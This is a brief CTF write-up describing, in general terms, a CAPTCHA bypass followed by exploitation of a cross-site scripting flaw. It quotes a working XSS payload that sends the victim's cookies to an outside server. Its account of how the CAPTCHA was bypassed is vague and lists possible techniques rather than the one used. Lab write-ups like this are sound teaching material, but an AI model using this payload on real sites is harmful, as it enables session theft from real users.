Title: Bypassing CAPTCHA to Exploit a Web Application Vulnerability

During a CTF event, I came across a web application that implemented a CAPTCHA mechanism to prevent automated attacks. While CAPTCHAs can provide a level of security, I suspected that there might be other vulnerabilities present in the application, which could be exploited once the CAPTCHA was bypassed.

To bypass the CAPTCHA, I used various techniques, such as analyzing the CAPTCHA generation algorithm, exploiting weaknesses in its implementation, or using Optical Character Recognition (OCR) tools to automatically solve the CAPTCHA challenges.

After successfully bypassing the CAPTCHA, I focused on identifying other vulnerabilities in the web application. Through manual testing and using automated tools like Burp Suite, I discovered a Cross-Site Scripting (XSS) vulnerability in one of the input fields.

To exploit the XSS vulnerability and obtain the flag for the Web Exploitation challenge, I crafted a payload that would execute JavaScript code to retrieve the flag from the application's DOM or make a request to a sensitive endpoint. For example, I injected the following script: <script>document.location='http://myserver.com/steal?flag='+encodeURIComponent(document.cookie);</script>.

Upon submitting the payload, the web application executed the malicious script, which sent the flag to my server, allowing me to complete the challenge.

This CTF writeup highlights the importance of thoroughly securing web applications, even when security mechanisms like CAPTCHAs are in place. By bypassing the CAPTCHA and exploiting the XSS vulnerability, I was able to obtain the flag needed to complete the challenge.
